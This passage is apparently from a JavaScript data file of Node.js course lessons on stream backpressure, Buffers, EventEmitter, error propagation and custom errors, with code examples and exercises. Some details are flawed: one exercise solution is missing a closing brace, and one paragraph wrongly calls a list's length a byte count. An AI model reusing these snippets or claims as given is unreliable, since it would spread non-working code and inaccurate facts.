If you hand-roll a write loop, you must honour the \`false\` return yourself: pause, await 'drain', resume. Ignoring it is the classic "the server OOMs only when users upload big files" bug.
    `,
    howItWorks: `
Backpressure is cooperative, not preemptive: \`write()\` returns a boolean and it is your code's job to stop. When the writable's buffer drops back under highWaterMark after the underlying sink (disk, socket) drains, it emits \`'drain'\` — the signal to resume. pipeline() implements exactly this loop: it subscribes to both sides, pauses the source when the sink is full, resumes on drain, and on any error calls \`.destroy(err)\` on all streams so no file descriptor or partial file survives.

Under the hood, chunk delivery is a microtask/I/O-driven pump on a single thread: the readable emits only when asked, so a slow consumer naturally limits how fast the producer is asked to read.
    `,
    codeExamples: [
      {
        title: "What naive pipe() gets wrong",
        language: "js",
        code: `import fs from "node:fs";

// "Looks fine" — fails the moment anything goes wrong
const src = fs.createReadStream("./incoming.zip");
const dst = fs.createWriteStream("./backup.zip");

src.pipe(dst);

src.on("error", (err) => console.error("read failed:", err)); // without this: process crash
dst.on("error", (err) => console.error("write failed:", err)); // source keeps reading anyway
dst.on("finish", () => console.log("copied")); // hard to await, easy to miss before exit`,
        description:
          "Three listeners, no error propagation between streams, no promise to await. If the disk fills up, the destination errors, the source is never destroyed, and nothing tells your request handler that the backup failed.",
      },
      {
        title: "pipeline() — and a hand-rolled loop that honours backpressure",
        language: "js",
        code: `import { pipeline } from "node:stream/promises";
import { once } from "node:events";
import fs from "node:fs";
import zlib from "node:zlib";

// 1) The production default: backpressure, error propagation and cleanup are built in
await pipeline(
  fs.createReadStream("./access.log"),
  zlib.createGzip(),
  fs.createWriteStream("./access.log.gz"),
);

// 2) What pipeline does for you, by hand — for when you must customise the loop
async function copy(src, dst) {
  try {
    for await (const chunk of src) {
      if (!dst.write(chunk)) {
        await once(dst, "drain"); // STOP feeding until the sink catches up
      }
    }
    dst.end();
    await new Promise((resolve, reject) => {
      dst.on("finish", resolve);
      dst.on("error", reject);
    });
  } catch (err) {
    dst.destroy(err);
    src.destroy(err);
    throw err;
  }
}`,
        description:
          "The first block is what you should write 95% of the time. The second shows the contract underneath: honour write() === false, await 'drain', and destroy both sides on failure so a 4 GB copy never buffers more than highWaterMark.",
      },
    ],
    commonMistakes: [
      "Using .pipe() with no 'error' listeners — an ENOENT or ENOSPC mid-transfer crashes the process or silently truncates the file.",
      "Ignoring write() === false in a custom loop — memory grows with every chunk while the consumer lags.",
      "Buffering a whole upload into memory (collecting every chunk into an array) instead of streaming it to disk or object storage.",
      "Forgetting dst.end() — the consumer waits forever for 'finish' and your await never resolves.",
    ],
    bestPractices: [
      "Default to stream/promises pipeline() for any multi-stream pipeline; reach for .pipe() only in throwaway scripts.",
      "Tune highWaterMark when a fast producer meets a slow consumer: larger smooths throughput, smaller bounds memory.",
      "Enforce a maximum upload size and destroy the source as soon as it is exceeded.",
      "Prefer async iteration (for await) when reading — it wires backpressure and error handling into the loop.",
    ],
    realWorldUseCases: [
      "Compressing and storing user uploads without ever holding the whole file in RAM — memory stays flat at any file size.",
      "Streaming database cursors through a CSV transform into an HTTP download response for a 200 GB export.",
    ],
    resources: [
      docs(
        "Node.js API — Streams",
        "https://nodejs.org/api/stream.html",
        "Backpressure, highWaterMark, destroy semantics and the pipeline helper, from the source.",
        "en",
        "reference",
      ),
      docs(
        "Node.js API — Timers/streams helper: pipeline() in stream/promises",
        "https://nodejs.org/api/stream.html#streampromisespipelinestreams-options",
        "Signature and behaviour of the promise-based pipeline used above.",
        "en",
        "8 min",
      ),
      ytSearch(
        "node.js streams backpressure drain pipeline explained",
        "Visual explanations of buffer filling, write() === false and the drain event.",
        "en",
        "15–25 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-backpressure",
        title: "Prove backpressure exists",
        prompt:
          "Create a writable stream whose _write logs when it is called and delays 50ms, then write 1000 chunks in a tight loop using (a) plain write() and (b) honouring false + 'drain'. Log process.memoryUsage().heapUsed for both and explain the difference. Report how many writes happened while write() returned false.",
        difficulty: "intermediate",
        estimatedMinutes: 35,
        hints: [
          "const ws = new Writable({ write(chunk, enc, cb) { setTimeout(cb, 50); } })",
          "Count write() === false returns; that number is your backlog peak.",
        ],
      },
      {
        id: "ex-p2m1-pipeline-swap",
        title: "Replace pipe with pipeline",
        prompt:
          "Take any script in this course (or write one) that copies or transforms a file with .pipe(), convert it to stream/promises pipeline, and prove the fix by making the destination fail on purpose (for example write to a path in a non-existent directory) and showing that (1) the error surfaces from your await, and (2) the source stream is destroyed rather than left running.",
        difficulty: "intermediate",
        estimatedMinutes: 25,
        hints: [
          "Wrap the await in try/catch and log err.code (ENOENT).",
          "Check src.destroyed — it should be true after the failure.",
        ],
        solution: `import { pipeline } from "node:stream/promises";
import fs from "node:fs";

const src = fs.createReadStream("./access.log");

try {
  await pipeline(src, fs.createWriteStream("./no-such-dir/out.gz"));
  console.log("copied");
} catch (err) {
  console.error("pipeline failed:", err.code); // ENOENT
  console.log("source destroyed:", src.destroyed); // true — no fd leak`,
        solutionLanguage: "js",
      },
    ],
    projectIds: ["p2-inventory-api"],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-buffer-handling",
    slug: "buffer-handling",
    title: "Buffer Handling and Binary Data",
    description:
      "Binary protocols, Buffer.concat pitfalls, encodings across chunk boundaries, pooling and why allocUnsafe can leak process memory.",
    order: 6,
    estimatedMinutes: 18,
    tags: ["buffer", "binary", "encoding"],
    prerequisites: ["p1m4-buffers", "p2m1-streams-backpressure"],
    relatedTopics: ["p2m1-streams-backpressure", "p1m4-buffers", "p1m4-streams"],
    learningObjectives: [
      "Explain what a Buffer is relative to TypedArrays, pooling and views",
      "Parse a length-prefixed binary framing protocol with correct offsets and endianness",
      "Use Buffer.concat without quadratic copying, and measure strings with byteLength",
      "Recognise the risks of allocUnsafe and of decoding chunks independently",
    ],
    simpleExplanation:
      "A Buffer is Node's byte array — raw memory for anything that is not text: file chunks, socket frames, images, protocol messages. Most bugs come from three misunderstandings: buffers can share memory, text can be split across chunks, and allocating 'unsafe' memory may hand you leftovers from earlier in the same process.",
    detailedContent: `
**Allocation**

- \`Buffer.alloc(n)\` — zero-filled, safe default.
- \`Buffer.allocUnsafe(n)\` — may return memory containing whatever was allocated before (a previous request's payload, a key). It is faster because it skips zeroing, and it is correct only when you overwrite **every** byte before anything can observe it. Pooled small allocations come from a shared 64 KiB slab (up to 32 KiB per allocation) — two small buffers often sit in the same \`ArrayBuffer\`, so keeping one alive keeps the slab alive.
- \`Buffer.from(string|array)\` **copies**; \`buf.slice()\` and \`Buffer.from(arrayBuffer, offset, len)\` create **views that share memory**. A slice is a window, not a copy — mutating it mutates the source.

**concat pitfalls**

\`Buffer.concat(list)\` copies everything into one fresh buffer. Doing \`acc = Buffer.concat([acc, chunk])\` inside a 'data' loop is O(n²): re-copying the whole accumulated payload per chunk causes serious GC churn on large responses. Collect chunks in an array, concat once at the end. Also: \`list\` must contain Buffers/Uint8Arrays — passing strings throws \`ERR_INVALID_ARG_TYPE\`, and \`list.length\` is a **byte** count, not a character count.

**Encodings**

Encodings are \`utf8\` (default), \`hex\`, \`base64\`, \`latin1\` (1 byte = 1 char, for raw bytes) and \`ascii\`. A multi-byte UTF-8 character split across two chunks becomes replacement characters if you call \`chunk.toString()\` per chunk — use \`StringDecoder\` from \`node:string_decoder\`, which holds the partial sequence. For headers such as Content-Length the size is \`Buffer.byteLength(str, "utf8")\`, never \`str.length\`.

**Framing**: the classic TCP mistake is assuming one 'data' event equals one message. TCP gives you a byte stream; you must frame it yourself, typically \`[type:1][length:4 big-endian][payload]\`.
    `,
    howItWorks: `
A Buffer is a Uint8Array over an ArrayBuffer: \`buf.buffer\` is the backing store, \`buf.byteOffset\` is where your view starts, \`buf.byteLength\` is its size. Slices and offset views point into the same backing memory, so \`buf.slice(0, 4)\` costs nothing but shares lifetime with the original.

When a socket delivers bytes, V8 hands the stream a Buffer that may be a view into a pooled slab. The parser therefore must copy out framed messages it intends to keep (Buffer.from(frame) or subarray + copy) or it will pin the slab. Endianness matters too: \`readUInt32BE\` reads network byte order (big-endian) — reading a big-endian length with \`readUInt32LE\` produces a wildly wrong size and a hang or a crash.
    `,
    codeExamples: [
      {
        title: "Frame a TCP-style protocol safely",
        language: "js",
        code: `import { StringDecoder } from "node:string_decoder";

// Wire format: [type:1 byte][length:4 bytes big-endian][payload]
function createParser(onMessage) {
  let buffer = Buffer.alloc(0);

  return function push(chunk) {
    buffer = Buffer.concat([buffer, chunk]); // accumulate ONCE — not inside a loop

    while (buffer.length >= 5) {
      const type = buffer.readUInt8(0);
      const len = buffer.readUInt32BE(1); // network byte order is big-endian
      if (buffer.length < 5 + len) return; // incomplete frame — wait for more bytes

      const payload = buffer.subarray(5, 5 + len);
      onMessage({ type, payload: Buffer.from(payload) }); // copy: we keep it past the next chunk
      buffer = buffer.subarray(5 + len); // consume the frame, keep the remainder
    }
  };
}

const decoder = new StringDecoder("utf8");
const onText = (chunk) => console.log(decoder.write(chunk) + decoder.end());`,
        description:
          "A single accumulator, big-endian length, an explicit 'wait for more bytes' case, and a copy of the payload we intend to hold on to. StringDecoder keeps a split multi-byte character intact across chunks.",
      },
      {
        title: "Where allocUnsafe and naive decoding bite",
        language: "js",
        code: `// 1) allocUnsafe can expose previous process memory until you overwrite it
const slot = Buffer.allocUnsafe(64);
// slot.toString("hex") may show data from an earlier allocation here
slot.fill(0); // only safe after EVERY byte is written

// 2) quadratic concat
async function bad(readable) {
  let acc = Buffer.alloc(0);
  for await (const chunk of readable) acc = Buffer.concat([acc, chunk]); // O(n2) copies
  return acc;
}

// 3) per-chunk toString corrupts multi-byte characters at the boundary
const a = Buffer.from("héllo"); // é is 2 bytes in UTF-8
console.log(a.subarray(0, 2).toString("utf8")); // "h" + replacement char

// 4) measuring text
const text = "héllo";
console.log(text.length, Buffer.byteLength(text, "utf8")); // 5 6 — use byteLength for headers`,
        description:
          "Four classic defects: leaking bytes, re-copying the entire payload per chunk, mangling UTF-8 at chunk boundaries, and using .length where HTTP needs a byte count.",
      },
    ],
    commonMistakes: [
      "Using allocUnsafe for anything observable before it is fully overwritten — it can leak other tenants' data in the same process.",
      "Buffer.concat([acc, chunk]) inside a loop, turning a 200 MB download into hundreds of MB of redundant copying.",
      "Calling chunk.toString('utf8') on every 'data' event, corrupting any character split across the boundary.",
      "Assuming one 'data' event equals one protocol message — TCP resegments arbitrarily; always frame.",
    ],
    bestPractices: [
      "Default to Buffer.alloc/Buffer.from; use allocUnsafe only in measured hot paths you fully overwrite.",
      "Accumulate chunks in an array and concat once, or parse incrementally with a persistent buffer.",
      "Use StringDecoder for text across chunks and Buffer.byteLength for Content-Length style measurements.",
      "Copy payloads you intend to retain (Buffer.from(frame)) so you do not pin pooled slab memory.",
    ],
    realWorldUseCases: [
      "A chat server speaking a custom binary protocol over raw TCP sockets (length-prefixed frames).",
      "Computing multipart/form-data boundaries and exact byte offsets for a correct upload parser.",
    ],
    resources: [
      docs(
        "Node.js API — Buffer",
        "https://nodejs.org/api/buffer.html",
        "Allocation, pooling, encodings, slice/view semantics and safety notes for allocUnsafe.",
        "en",
        "reference",
      ),
      docs(
        "Node.js API — String decoder",
        "https://nodejs.org/api/string_decoder.html",
        "How to decode text that is split across chunk boundaries.",
        "en",
        "6 min",
      ),
      docs(
        "MDN — ArrayBuffer",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer",
        "The underlying memory every Buffer/TypedArray view is built on.",
        "en",
        "8 min",
      ),
      ytSearch(
        "node.js buffer binary protocol parse frames",
        "Hands-on framing and encoding examples with sockets.",
        "en",
        "15–25 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-frame",
        title: "Build a frame parser",
        prompt:
          "Write a parser for the framing format above and test it by splitting ONE logical message into three arbitrary chunk boundaries (for example 3 bytes, then 7, then the rest). Show that the message is still parsed exactly once, then send two messages back-to-back in a single chunk and show both come out.",
        difficulty: "intermediate",
        estimatedMinutes: 35,
        hints: [
          "Keep the leftover bytes in the accumulator across push() calls.",
          "Test both under-fill (wait for more) and over-fill (loop until the remainder is < 5 bytes).",
        ],
      },
      {
        id: "ex-p2m1-encoding",
        title: "Find the byte boundary bug",
        prompt:
          "Create a string that contains a multi-byte character (é, 日本語), write it to a file, and read the file back in chunks of 3 bytes with a plain 'data' handler that calls chunk.toString(). Count replacement characters. Then redo it with StringDecoder and show zero corruption.",
        difficulty: "intermediate",
        estimatedMinutes: 25,
        hints: [
          "Use fs.createReadStream(path, { highWaterMark: 3 }).",
          "Compare output lengths: replacement characters mean a broken sequence.",
        ],
        solution: `import fs from "node:fs";
import { StringDecoder } from "node:string_decoder";

const text = "日本語 ok";
fs.writeFileSync("./t.txt", text);

let naive = "";
for await (const c of fs.createReadStream("./t.txt", { highWaterMark: 3 })) {
  naive += c.toString("utf8"); // corrupts split sequences
}
console.log("naive matches:", naive === text); // false

const decoder = new StringDecoder("utf8");
let safe = "";
for await (const c of fs.createReadStream("./t.txt", { highWaterMark: 3 })) {
  safe += decoder.write(c);
}
safe += decoder.end();
console.log("decoder matches:", safe === text); // true`,
        solutionLanguage: "js",
      },
    ],
    projectIds: ["p2-chat-backend"],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-eventemitter-advanced",
    slug: "eventemitter-patterns",
    title: "Advanced EventEmitter Patterns",
    description:
      "once/emit contracts, the special 'error' event, listener leaks, and when to reach for EventTarget instead of EventEmitter.",
    order: 7,
    estimatedMinutes: 18,
    tags: ["events", "eventemitter", "memory"],
    prerequisites: ["p1m4-events-eventemitter"],
    relatedTopics: ["p2m1-memory-management", "p2m1-error-propagation", "p1m4-events-eventemitter"],
    learningObjectives: [
      "Explain the 'error' event contract and why emitting it without a listener crashes",
      "Use once(), off() and listener counts to build leak-free request-scoped handlers",
      "Compare EventEmitter with EventTarget (DOM/AbortSignal) and pick one deliberately",
      "Design a typed event API with documented names, payloads and ordering guarantees",
    ],
    simpleExplanation:
      "An EventEmitter is a named mailbox: code says on('job-done', fn) and later emit('job-done', data) to call every listener synchronously, in registration order. Two rules dominate real usage: emitting 'error' with no listener throws, and a listener that is added per request but never removed becomes a permanent memory leak.",
    detailedContent: `
**The 'error' event is special.** \`emitter.emit('error', err)\` with no \`'error'\` listener does not return false — it **throws** the error synchronously, which becomes an uncaught exception and takes the process down. Any object you expose that can emit errors needs a default error listener (this is exactly how streams behave: a readable with no 'error' handler crashes Node).

**Listener management**

- \`on\`/\`addListener\` append; \`off\`/\`removeListener\` remove by **function reference** — passing a fresh arrow function is a no-op, so keep the reference.
- \`once\` self-removes after the first emit: perfect for request/response correlation, dangerous if the reply never comes (the listener stays forever unless you time it out and call \`off\`).
- The default limit is 10 listeners per event name; exceeding it emits \`MaxListenersExceededWarning\` — a warning about leaks, not a limit that protects you. Raise it only when the fan-out is genuinely large.
- \`emit\` is **synchronous**: listeners run in order on the current stack, an exception in listener #1 prevents #2 from running, and your emit returns before any listener's async work starts.

**EventTarget vs EventEmitter**: EventTarget (the DOM model, also available in Node for AbortController, MessagePort and others) uses \`addEventListener\`/\`removeEventListener\` with \`{ once: true }\`, dispatches \`CustomEvent\` objects carrying \`detail\`, has no 'error' special case, exposes no listener inspection, and integrates with \`signal:\` options in fetch, timers and child processes. Choose EventEmitter for Node-internal and library APIs where you need \`once\`, counts and chaining; choose EventTarget when interop with \`AbortSignal\`/DOM semantics matters.
    `,
    howItWorks: `
EventEmitter keeps an \`_events\` object: a map from event name to an array of listener functions (single-listener fast path aside). \`on()\` appends to that array and returns \`this\` for chaining. \`emit(name, ...args)\` takes a **snapshot** of the array, iterates it synchronously, and returns whether any listener existed — so adding or removing listeners during emit affects the next emit, not the current one. The 'error' special case lives right there: if the snapshot is empty for the name 'error', emit throws the passed error instead of returning false.

Each listener closure retains everything it references — which is why a long-lived emitter plus request-scoped closures retains request buffers, sockets and timers until the listener is removed.
    `,
    codeExamples: [
      {
        title: "once() with a timeout so no listener is ever orphaned",
        language: "js",
        code: `import { EventEmitter } from "node:events";

class JobQueue extends EventEmitter {
  constructor() {
    super();
    this.setMaxListeners(0); // 0 = unlimited; only do this when fan-out is genuinely large
  }
}

const queue = new JobQueue();

// Required: emit("error", ...) without this listener THROWS and crashes the process.
queue.on("error", (err) => console.error("queue error:", err));

function waitForJob(jobId, ms = 5000) {
  return new Promise((resolve, reject) => {
    const onDone = (result) => {
      clearTimeout(timer);
      resolve(result);
    };
    const timer = setTimeout(() => {
      queue.off("done:" + jobId, onDone); // never leave an orphan listener behind
      reject(new Error("job " + jobId + " timed out"));
    }, ms);

    queue.once("done:" + jobId, onDone); // self-removes on first emit
  });
}`,
        description:
          "The combination that survives a lost reply: once() for the happy path, a timeout that explicitly removes the listener, and a mandatory error listener so failure is a rejection instead of a crash.",
      },
      {
        title: "The leak, the fix, and the EventTarget alternative",
        language: "js",
        code: `import { EventEmitter } from "node:events";

const bus = new EventEmitter();

// BAD — a fresh closure per request, never removed
function attachLeaky(res) {
  bus.on("data", (chunk) => res.write(chunk));
}

// GOOD — keep the reference so off() can actually find it
function attach(res) {
  const handler = (chunk) => res.write(chunk);
  bus.on("data", handler);
  return () => bus.off("data", handler);
}

console.log(bus.listenerCount("data")); // inspect growth under load

// EventTarget style: no 'error' special case, { once: true } built in
const target = new EventTarget();
const listener = (ev) => console.log("job", ev.detail.id);
target.addEventListener("job", listener, { once: true });
target.dispatchEvent(new CustomEvent("job", { detail: { id: 7 } }));
target.removeEventListener("job", listener); // safe even if it never fired`,
        description:
          "Attach/detach symmetry is the whole discipline: whatever you add in a request handler must be removed in the same request's close/error path. EventTarget gives you { once: true } and abort-style interop but no listener inspection or 'error' semantics.",
      },
    ],
    commonMistakes: [
      "Emitting 'error' on an emitter nobody listens to — the error is thrown from emit() and crashes the process.",
      "Registering listeners inside per-request handlers and removing them with a recreated arrow function (different reference → no-op).",
      "Assuming emit is asynchronous or queued — it is synchronous, so later listeners wait for earlier ones' synchronous work.",
      "Silencing MaxListenersExceededWarning with setMaxListeners(0) while the underlying leak keeps growing.",
    ],
    bestPractices: [
      "Document event names and payload shapes as a public contract — type them (TypeScript: interface with tuple payloads).",
      "Add and remove listeners in symmetric places (open/close, init/dispose), and prefer once() plus a timeout for handshakes.",
      "Log listener counts (eventNames(), listenerCount()) on a health endpoint so leaks show up as a metric.",
      "Pick EventEmitter for Node/library APIs and EventTarget when you need AbortSignal or DOM-compatible semantics.",
    ],
    realWorldUseCases: [
      "An SSE fan-out bus where every connected client holds exactly one listener, removed on 'close'.",
      "Wiring request timeouts through AbortSignal — an EventTarget — instead of hand-rolled cancel flags.",
    ],
    resources: [
      docs(
        "Node.js API — Events (EventEmitter)",
        "https://nodejs.org/api/events.html",
        "Emit semantics, the 'error' event contract, once/off and listener limits.",
        "en",
        "reference",
      ),
      docs(
        "MDN — EventTarget",
        "https://developer.mozilla.org/en-US/docs/Web/API/EventTarget",
        "The DOM event model Node shares for AbortController and MessagePort.",
        "en",
        "8 min",
      ),
      ytSearch(
        "node eventemitter error event memory leak fix",
        "Walkthroughs of MaxListenersExceededWarning and listener cleanup patterns.",
        "en",
        "10–20 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-listener-leak",
        title: "Measure a listener leak",
        prompt:
          "Build the SSE example from the lesson, hit it with 100 connect/disconnect cycles without removing listeners, and record bus.listenerCount('data') plus process.memoryUsage().heapUsed at cycles 10/50/100. Then add the off() call in the close handler and repeat. Write three sentences interpreting both numbers.",
        difficulty: "intermediate",
        estimatedMinutes: 35,
        hints: [
          "Log listenerCount at each cycle — that is your leak rate.",
          "heapUsed will grow roughly linearly with retained response objects.",
        ],
      },
      {
        id: "ex-p2m1-error-contract",
        title: "Prove the error contract",
        prompt:
          "Write two scripts: (1) emit an Error on a bare EventEmitter with no error listener; (2) the same emit after adding one. Record the exact behaviour of each (exit code, stack) and explain in two sentences why the design exists — what would be worse: crashing, or silently dropping the error?",
        difficulty: "intermediate",
        estimatedMinutes: 20,
        hints: ["Run each with node and check $LASTEXITCODE.", "Silently dropped errors are how outages stay invisible."],
      },
    ],
    projectIds: ["p2-chat-backend"],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-error-propagation",
    slug: "error-propagation",
    title: "Error Propagation in Node.js",
    description:
      "Sync throws vs promise rejections, where try/catch/finally/catch actually apply, and what process-level defaults do when nothing catches.",
    order: 8,
    estimatedMinutes: 20,
    tags: ["errors", "async", "process"],
    prerequisites: ["p1m4-error-handling-node", "p1m2-error-handling-try-catch", "p2m1-advanced-promises"],
    relatedTopics: ["p2m1-custom-errors", "p2m1-eventemitter-advanced", "p2m1-process-signals"],
    learningObjectives: [
      "Distinguish the three propagation channels: throw, rejected promise, emitter 'error'",
      "Say exactly which failures a given try/catch can and cannot see",
      "Explain uncaughtException/unhandledRejection defaults and why they are not control flow",
      "Design one top-level error boundary for a server",
    ],
    simpleExplanation:
      "Errors travel down three different roads: a synchronous throw unwinds the call stack to the nearest try/catch, a rejected promise travels along its chain to the next .catch, and an EventEmitter 'error' event jumps straight to a listener. If none of the three finds a handler, Node's default policy is to log and terminate the process.",
    detailedContent: `
**Channel 1 — synchronous throw.** Propagates up the stack until a \`try/catch\` handles it. If the stack unwinds to the top, Node emits \`uncaughtException\`, prints the stack and exits with code 1.

**Channel 2 — rejected promise.** Propagates through \`.then\`/\`.catch\` reactions. A \`try/catch\` sees it **only if you await** the promise: \`try { await p } catch {}\` works, \`try { p } catch {}\` never will — the throw happens later, on a stack that no longer contains your try. With no handler within a turn of the loop, Node emits \`unhandledRejection\` and (default mode \`throw\`) raises it as an uncaught exception → exit code 1. Attaching \`.catch\` later triggers \`rejectionHandled\` instead.

**Channel 3 — EventEmitter 'error'.** \`emit('error', err)\` with no listener **throws synchronously from emit()** (see the EventEmitter lesson).

Failures a given try/catch **cannot** see: callbacks scheduled by that code (\`setTimeout(() => { throw ... })\`), errors inside event handlers, and errors in promises you never awaited. Express route handlers using async functions need explicit forwarding: \`try { await ... } catch (err) { next(err) }\` (Express 5 forwards rejected promises automatically).

**Process-level defaults**: \`uncaughtException\` and \`unhandledRejection\` are last-resort safety nets. The documented correct use is to log synchronously and **shut down** — never "keep serving after an unknown error", because the heap, connections and in-memory state are now suspect. An external supervisor (systemd, Kubernetes, PM2) should restart you. Turning these events into business logic hides bugs and turns 500s into corrupted state.
    `,
    howItWorks: `
When an exception escapes to the top of the stack, V8 hands it to Node, which checks for a registered \`uncaughtException\` listener: if one exists, it runs (and unless you set \`process.exitCode\` or call \`process.exit\`, the process continues with whatever state it has); if none exists, Node prints the error and exits 1.

For promises, V8 marks a rejected promise as "pending observation". When the microtask queue drains and no reaction ever handled it, Node fires \`unhandledRejection\` with the promise reference — so monitoring can literally count escaping rejections. Both events are asynchronous, which is why an immediately attached \`.catch\` in the same tick still counts as handled.
    `,
    codeExamples: [
      {
        title: "What each channel can and cannot catch",
        language: "js",
        code: `import { EventEmitter } from "node:events";

// 1) Sync throw — caught here
try {
  JSON.parse("{");
} catch (err) {
  console.log("sync caught:", err.message);
}

// 2) Rejection — caught only because we await
async function readConfig(p) {
  try {
    await Promise.reject(new Error("boom"));
  } catch (err) {
    console.log("await caught:", err.message);
  }
}
readConfig();
// Same rejection WITHOUT await would escape to process level:
Promise.reject(new Error("orphan")).catch(() => {}); // attaching in the same tick = handled

// 3) EventEmitter — emit with no listener throws synchronously
const ee = new EventEmitter();
ee.on("error", (err) => console.log("emitter caught:", err.message));
ee.emit("error", new Error("signal"));

// 4) Timer callbacks are a different stack — the caller's try/catch is gone
setTimeout(() => {
  try {
    throw new Error("in timer");
  } catch (err) {
    console.log("timer caught locally:", err.message);
  }
}, 0);`,
        description:
          "Each channel needs its own handler type: try/catch for sync code and awaited promises, .catch for the promise itself, an 'error' listener for emitters, and local try/catch inside timer callbacks.",
      },
      {
        title: "A top-level boundary that logs and shuts down",
        language: "js",
        code: `import http from "node:http";

const server = http.createServer((req, res) => res.end("ok"));
server.listen(3000);

let shuttingDown = false;
function shutdown(code) {
  if (shuttingDown) return;
  shuttingDown = true;
  console.error("fatal — draining and exiting");
  server.close(() => process.exit(code));
  setTimeout(() => process.exit(code), 3000).unref(); // bound the wait
}

// Safety net, NOT business logic
process.on("unhandledRejection", (reason) => {
  console.error("unhandled rejection:", reason);
  shutdown(1);
});
process.on("uncaughtException", (err, origin) => {
  console.error("uncaught exception (" + origin + "):", err);
  shutdown(1);
});`,
        description:
          "Register these once at boot. Log synchronously, stop accepting connections, exit non-zero, and let the orchestrator restart with a clean heap — never resume normal service after an unknown error.",
      },
    ],
    commonMistakes: [
      "Wrapping an async call in try/catch but firing the promise elsewhere — the rejection escapes and becomes process-level.",
      "Catching, logging and returning undefined, so downstream code fails later with a confusing TypeError.",
      "Using uncaughtException to 'keep the app running' after an unknown failure — the documented correct use is cleanup plus exit.",
      "try/catch around setTimeout(fn) expecting to catch errors thrown inside fn — the callback runs on a different stack.",
    ],
    bestPractices: [
      "Convert every async failure into an explicit result at one boundary (the HTTP layer) instead of ad hoc responses everywhere.",
      "Register process-level handlers as last-resort logging + shutdown, and restart via an external supervisor.",
      "In Express, always forward with next(err) so one error middleware formats all failures consistently.",
      "Re-throw errors you do not recognise after doing local cleanup — never swallow an unknown failure.",
    ],
    realWorldUseCases: [
      "A unique-constraint violation becoming a 409 at the controller boundary, with the driver error preserved as cause.",
      "A worker that logs and exits non-zero on an unknown error so the orchestrator replaces it with a fresh heap.",
    ],
    resources: [
      docs(
        "Node.js API — Errors",
        "https://nodejs.org/api/errors.html",
        "Error classes, error codes and Node's conventions for operational failures.",
        "en",
        "reference",
      ),
      docs(
        "Node.js API — Process events (uncaughtException, unhandledRejection)",
        "https://nodejs.org/api/process.html",
        "The documented rules for using the process-level error events safely.",
        "en",
        "15 min",
      ),
      docs(
        "Express — Error handling",
        "https://expressjs.com/en/guide/error-handling.html",
        "next(err), error middleware and forwarding async failures.",
        "en",
        "10 min",
      ),
      ytSearch(
        "node.js error handling unhandledrejection uncaughtexception",
        "Demos of the default failure modes and how to instrument them.",
        "en",
        "10–20 min",
      ),
    ],
    exercises: [
      {
        id: "ex-p2m1-channels",
        title: "Classify the failures",
        prompt:
          "For each snippet say which handler (if any) sees the error and what the process does if you add none: (1) a function that throws before any await; (2) an async function whose awaited call rejects, called without await or catch; (3) JSON.parse inside a .then callback; (4) an emitter.emit('error') with no listener; (5) a rejected promise with .catch attached three awaits later.",
        difficulty: "intermediate",
        estimatedMinutes: 25,
        hints: [
          "Anything you await inside try/catch is catchable; a bare promise is not.",
          "Case 5: Node fires unhandledRejection first, then rejectionHandled — behavior differs by mode.",
        ],
      },
      {
        id: "ex-p2m1-boundary",
        title: "Build the boundary",
        prompt:
          "Write an HTTP server with one deliberately failing route (async rejection, sync throw and emitter error variants). Add process-level handlers that log with a timestamp and exit 1 after server.close(). Prove with curl that normal routes still respond, then trigger each failure and record the exit code and the last log line.",
        difficulty: "intermediate",
        estimatedMinutes: 40,
        hints: [
          "Use process.exitCode or process.exit — a bare uncaughtException listener otherwise exits 0.",
          "Add a timeout so a stuck close() does not hang the shutdown.",
        ],
        solution: `import http from "node:http";

const server = http.createServer(async (req, res) => {
  if (req.url === "/fail") {
    await Promise.reject(new Error("async failure")); // unhandled without try/catch
  }
  res.end("ok");
});
server.listen(3000);

const fail = (origin, err) => {
  console.error(new Date().toISOString(), origin, err);
  server.close(() => process.exit(1));
  setTimeout(() => process.exit(1), 3000).unref();
};
process.on("unhandledRejection", (reason) => fail("unhandledRejection", reason));
process.on("uncaughtException", (err) => fail("uncaughtException", err));`,
        solutionLanguage: "js",
      },
    ],
    projectIds: ["p2-task-api"],
    quizId: "quiz-p2-m1",
  },
  {
    ...shared,
    id: "p2m1-custom-errors",
    slug: "custom-errors",
    title: "Custom Error Types",
    description:
      "Extending Error correctly, machine-readable error codes, operational vs programmer errors, and serializing errors across service boundaries.",
    order: 9,
    estimatedMinutes: 18,
    tags: ["errors", "api-design", "patterns"],
    prerequisites: ["p2m1-error-propagation"],
    relatedTopics: ["p2m1-error-propagation", "p1m4-error-handling-node", "p1m1-status-codes"],
    learningObjectives: [
      "Extend Error with correct name, prototype and stack in JavaScript and TypeScript",
      "Attach stable error codes and map error types to HTTP statuses in one place",
      "Separate operational errors (handle) from programmer errors (fix, do not swallow)",
      "Serialize errors across processes without losing message, code or cause",
    ],
    simpleExplanation:
      "A custom error class gives your failures an identity: code, HTTP status and structured details that clients and logging can branch on. It matters because JSON.stringify(new Error('x')) is '{}', messages are not an API contract, and 'is this failure expected?' decides whether you retry, return a 4xx, or restart the process.",
    detailedContent: `
**Writing the class.** Set \`this.name\`, keep \`message\`, capture the stack, and add your own fields:

- \`Object.setPrototypeOf(this, new.target.prototype)\` — required only when compiling to ES5, where \`class extends Error\` breaks \`instanceof\`. With a modern target it is harmless.
- \`Error.captureStackTrace(this, this.constructor)\` (V8) trims helper frames so the stack starts at your throw site.
- \`cause\` (\`new Error(msg, { cause })\`, ES2022) chains the original driver/network error without string concatenation.

**Codes, not messages.** Follow Node's own convention: \`error.code\` is a stable string (\`'DB_DOWN'\`, \`'EMAIL_TAKEN'\`), \`message\` is for humans and logs. Clients branch on codes; translators localise messages. Messages are not stable and must never be part of your API contract.

**Operational vs programmer errors.**

- *Operational* (expected): ENOENT, timeouts, unique violations, 429s → catch, log with context, return a typed response, maybe retry.
- *Programmer* (bugs): reading \`undefined.x\`, wrong argument types, unreachable branches → do not catch-and-continue; let them fail tests or crash the process so a supervisor restarts it.

A practical test: *can I enumerate every place this error legitimately happens and handle it?* If no, it is a bug, not an operational condition.

